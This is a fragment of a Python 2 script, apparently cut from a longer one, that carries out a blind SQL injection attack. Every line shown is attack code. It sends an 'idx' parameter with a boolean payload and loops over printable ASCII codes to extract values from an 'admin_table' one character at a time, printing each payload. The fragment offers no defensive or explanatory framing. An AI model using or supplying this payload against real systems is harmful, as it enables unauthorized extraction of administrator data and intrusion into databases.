...
while True:
    for j in range(33, 128):
        data = {'idx': "37869 and if(ascii(substr((select "+column+" from admin_table limit "+str(limit)+",1)," + str(i) + ",1))=" + str(j) + ",1,0)"}
        response = requests.post(url, headers=headers, cookies=cookies, data=data)
        status_code = response.status_code
        html_data = response.text
        print "37869 and if(ascii(substr((select "+column+" from admin_table limit "+str(limit)+",1)," + str(i) + ",1))=" + str(j) + ",1,0)"
